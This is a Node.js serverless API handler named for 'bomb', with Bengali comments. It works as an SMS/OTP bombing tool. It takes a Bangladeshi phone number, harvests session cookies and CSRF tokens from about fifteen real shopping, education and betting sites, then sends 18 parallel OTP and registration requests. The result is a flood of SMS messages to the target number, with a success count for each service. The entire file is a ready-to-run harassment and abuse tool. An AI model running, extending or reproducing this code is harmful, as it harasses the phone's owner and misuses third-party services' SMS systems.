const fetch = require('node-fetch');

module.exports = async (req, res) => {
    const { num } = req.query;

    if (!num) {
        return res.status(400).json({
            status: 'error',
            message: 'URL-এ ?num= নম্বর দেওয়া হয়নি! (উদাহরণ: /api/bomb?num=01328308987)'
        });
    }

    const rawNum = num.trim();
    const standard11Digit = rawNum.length === 10 ? '0' + rawNum : (rawNum.startsWith('+88') ? rawNum.slice(3) : rawNum);
    const clean10Digit = standard11Digit.startsWith('0') ? standard11Digit.substring(1) : standard11Digit;
    const withCountryCode = '+88' + standard11Digit;
    const UA = 'Mozilla/5.0 (Linux; Android 10; STK-L22 Build/HUAWEISTK-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.8010.36 Mobile Safari/537.36';

    // ===== হেল্পার: সাইট থেকে cookie fetch =====
    async function getCookie(url) {
        try {
            const r = await fetch(url, {
                method: 'GET',
                headers: { 'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml' }
            });
            const sc = r.headers.raw()['set-cookie'] || [];
            return sc.map(c => c.split(';')[0]).join('; ');
        } catch (e) { return ''; }
    }

    // ===== হেল্পার: cookie থেকে XSRF টোকেন বের করা =====
    function xsrfFromCookie(cookie) {
        const m = cookie.match(/XSRF-TOKEN=([^;]+)/);
        return m ? decodeURIComponent(m[1]) : '';
    }

    // ===== প্রতিটি Laravel সাইটের cookie আগেই নিয়ে রাখা =====
    const [
        cBabybondhon, cMeskat, cFynaset, cShafimtex,
        cZerobangla, cLooksbd, cNogori, cTogumogu,
        cMediking, cAkboria, cYusha, cUrbalandbd, cGodxg, cGhorerbazar, cRiointernational
    ] = await Promise.all([
        getCookie('https://babybondhon.com/login-otp'),
        getCookie('https://www.meskat.com/login-otp'),
        getCookie('https://fynaset.com/login-otp'),
        getCookie('https://shafimtex.com/login-otp'),
        getCookie('https://zerobangla.com/login-otp'),
        getCookie('https://looksbd.com/login-otp'),
        getCookie('https://nogori.com/varify/otp'),
        getCookie('https://togumogu.com/'),
        getCookie('https://mediking.com.bd/otp_login'),
        getCookie('https://akboria.com/varify/otp'),
        getCookie('https://yusha.com.bd/varify/otp'),
        getCookie('https://urbalandbd.com/varify/otp'),
        getCookie('https://godxg.com/varify/otp'),
        getCookie('https://ghorerbazar.com/varify/otp'),
        getCookie('https://riointernational.com.bd/varify/otp')
    ]);

    // ===== সব রিকোয়েস্ট (২৩টি) =====
    const requests = [
        // ============ পুরনো ১০টি ============
        { name: 'Mediking', url: `https://mediking.com.bd/otp_login?phone=${standard11Digit}`, options: { method: 'GET', headers: { 'User-Agent': UA, 'X-Requested-With': 'mark.via.gp', 'Cookie': cMediking } } },
        { name: 'Akboria', url: `https://akboria.com/varify/otp?phone=${standard11Digit}`, options: { method: 'GET', headers: { 'User-Agent': UA, 'X-Requested-With': 'mark.via.gp', 'Cookie': cAkboria } } },
        { name: 'Rangs', url: 'https://ecom.rangs.com.bd/send-otp-code', options: { method: 'POST', headers: { 'Content-Type': 'application/json', 'Origin': 'https://shop.rangs.com.bd', 'Referer': 'https://shop.rangs.com.bd/', 'User-Agent': UA, 'Accept': 'application/json', 'X-Requested-With': 'mark.via.gp', 'Authorization': 'Bearer ' }, body: JSON.stringify({ mobile: withCountryCode, type: 1, hash: '1c749e89265090bab485ae10cee6f8bfe5beff0834cd75f58a985dc47a844d3c' }) } },
        { name: 'Yusha', url: `https://yusha.com.bd/varify/otp?phone=${standard11Digit}`, options: { method: 'GET', headers: { 'User-Agent': UA, 'X-Requested-With': 'mark.via.gp', 'Cookie': cYusha } } },
        { name: 'Urbalandbd', url: `https://urbalandbd.com/varify/otp?phone=${standard11Digit}`, options: { method: 'GET', headers: { 'User-Agent': UA, 'X-Requested-With': 'mark.via.gp', 'Cookie': cUrbalandbd } } },
        { name: '1Xbet', url: 'https://bd.1xbet.com/web-api/api/web/registration/v2/sms', options: { method: 'POST', headers: { 'Content-Type': 'application/vnd.api+json', 'Accept': 'application/vnd.api+json', 'Origin': 'https://bd.1xbet.com', 'Referer': 'https://bd.1xbet.com/en/registration', 'User-Agent': UA, 'x-app-n': 'WELCOME_APP', 'x-svc-source': 'WELCOME_APP', 'is-srv': 'false', 'Cookie': 'platform_type=desktop; lng=en' }, body: JSON.stringify({ data: { attributes: { phone: clean10Digit, country_code: '880' } } }) } },
        { name: 'Godxg', url: `https://godxg.com/varify/otp?phone=${standard11Digit}`, options: { method: 'GET', headers: { 'User-Agent': UA, 'X-Requested-With': 'mark.via.gp', 'Cookie': cGodxg } } },
        { name: 'Pickaboo', url: 'https://www.pickaboo.com/rest/default/V1/customer-check/exist', options: { method: 'POST', headers: { 'Content-Type': 'application/json', 'Origin': 'https://www.pickaboo.com', 'Referer': 'https://www.pickaboo.com/', 'User-Agent': UA, 'X-Requested-With': 'mark.via.gp' }, body: JSON.stringify({ mobile: standard11Digit }) } },
        { name: '10 Minute School', url: 'https://api.10minuteschool.com/auth/v1/userExists', options: { method: 'POST', headers: { 'Content-Type': 'application/json', 'Origin': 'https://10minuteschool.com', 'Referer': 'https://10minuteschool.com/', 'User-Agent': UA, 'x-tenms-source-lang': 'bn', 'x-tenms-source-platform': 'web', 'X-Requested-With': 'mark.via.gp' }, body: JSON.stringify({ username: withCountryCode, loginType: 'phone', g_recaptcha_response: '...' }) } },
        { name: 'Ostad', url: 'https://api.ostad.app/api/v2/user/with-otp', options: { method: 'POST', headers: { 'Content-Type': 'application/json', 'Origin': 'https://ostad.app', 'Referer': 'https://ostad.app/', 'User-Agent': UA, 'X-Requested-With': 'mark.via.gp', 'fingerprint': 'c65cda4dfa7a9e6d685e6e5cf453dda5' }, body: JSON.stringify({ msisdn: standard11Digit }) } },

        // ============ নতুন ৮টি ============
        // Togumogu (XSRF + cookie)
        {
            name: 'Togumogu',
            url: 'https://api.togumogu.com/api/auth/verification-code',
            options: {
                method: 'POST',
                headers: {
                    'User-Agent': UA,
                    'Accept': 'application/json, text/plain, */*',
                    'Content-Type': 'application/json',
                    'Origin': 'https://togumogu.com',
                    'Referer': 'https://togumogu.com/',
                    'X-Requested-With': 'mark.via.gp',
                    'x-utm-source': 'chatgpt.com',
                    'x-xsrf-token': xsrfFromCookie(cTogumogu),
                    'Cookie': cTogumogu
                },
                body: JSON.stringify({ mobile: standard11Digit, sendTo: 'mobile' })
            }
        },
        // Babybondhon
        {
            name: 'Babybondhon',
            url: 'https://babybondhon.com/send-otp',
            options: {
                method: 'POST',
                headers: {
                    'User-Agent': UA,
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Origin': 'https://babybondhon.com',
                    'Referer': 'https://babybondhon.com/login-otp',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-CSRF-TOKEN': xsrfFromCookie(cBabybondhon),
                    'Cookie': cBabybondhon
                },
                body: `mobile_no=${standard11Digit}`
            }
        },
        // Meskat
        {
            name: 'Meskat',
            url: 'https://www.meskat.com/send-otp',
            options: {
                method: 'POST',
                headers: {
                    'User-Agent': UA,
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Origin': 'https://www.meskat.com',
                    'Referer': 'https://www.meskat.com/login-otp',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-CSRF-TOKEN': xsrfFromCookie(cMeskat),
                    'Cookie': cMeskat
                },
                body: `mobile_no=${standard11Digit}`
            }
        },
        // Fynaset
        {
            name: 'Fynaset',
            url: 'https://fynaset.com/send-otp',
            options: {
                method: 'POST',
                headers: {
                    'User-Agent': UA,
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Origin': 'https://fynaset.com',
                    'Referer': 'https://fynaset.com/login-otp',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-CSRF-TOKEN': xsrfFromCookie(cFynaset),
                    'Cookie': cFynaset
                },
                body: `mobile_no=${standard11Digit}`
            }
        },
        // Shafimtex
        {
            name: 'Shafimtex',
            url: 'https://shafimtex.com/send-otp',
            options: {
                method: 'POST',
                headers: {
                    'User-Agent': UA,
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Origin': 'https://shafimtex.com',
                    'Referer': 'https://shafimtex.com/login-otp',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-CSRF-TOKEN': xsrfFromCookie(cShafimtex),
                    'Cookie': cShafimtex
                },
                body: `mobile_no=${standard11Digit}`
            }
        },
        // Zerobangla
        {
            name: 'Zerobangla',
            url: 'https://zerobangla.com/send-otp',
            options: {
                method: 'POST',
                headers: {
                    'User-Agent': UA,
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Origin': 'https://zerobangla.com',
                    'Referer': 'https://zerobangla.com/login-otp',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-CSRF-TOKEN': xsrfFromCookie(cZerobangla),
                    'Cookie': cZerobangla
                },
                body: `mobile_no=${standard11Digit}`
            }
        },
        // Looksbd
        {
            name: 'Looksbd',
            url: 'https://looksbd.com/send-otp',
            options: {
                method: 'POST',
                headers: {
                    'User-Agent': UA,
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Origin': 'https://looksbd.com',
                    'Referer': 'https://looksbd.com/login-otp',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-CSRF-TOKEN': xsrfFromCookie(cLooksbd),
                    'Cookie': cLooksbd
                },
                body: `mobile_no=${standard11Digit}`
            }
        },
        // Nogori
        {
            name: 'Nogori',
            url: `https://nogori.com/varify/otp?phone=${standard11Digit}`,
            options: {
                method: 'GET',
                headers: {
                    'User-Agent': UA,
                    'X-Requested-With': 'mark.via.gp',
                    'Cookie': cNogori
                }
            }
        }
    ];

    // ===== সব রিকোয়েস্ট চালানো =====
    const results = await Promise.allSettled(
        requests.map(async (r) => {
            try {
                const controller = new AbortController();
                const timeout = setTimeout(() => controller.abort(), 8000);

                const response = await fetch(r.url, {
                    ...r.options,
                    signal: controller.signal
                });
                clearTimeout(timeout);

                if (response.ok) {
                    return { name: r.name, status: 'Success', code: response.status };
                } else {
                    throw { name: r.name, status: 'Failed', code: response.status };
                }
            } catch (err) {
                throw { name: r.name, status: 'Failed', error: err.message || err.code };
            }
        })
    );

    let successCount = 0, failedCount = 0;
    const details = [];

    results.forEach((r, index) => {
        if (r.status === 'fulfilled') {
            successCount++;
            details.push({ service: r.value.name, status: 'Success' });
        } else {
            failedCount++;
            details.push({
                service: requests[index].name,
                status: 'Failed',
                reason: r.reason.error || `HTTP ${r.reason.code}`
            });
        }
    });

    return res.status(200).json({
        target_number: standard11Digit,
        total_requests: requests.length,
        success: successCount,
        failed: failedCount,
        details: details
    });
};
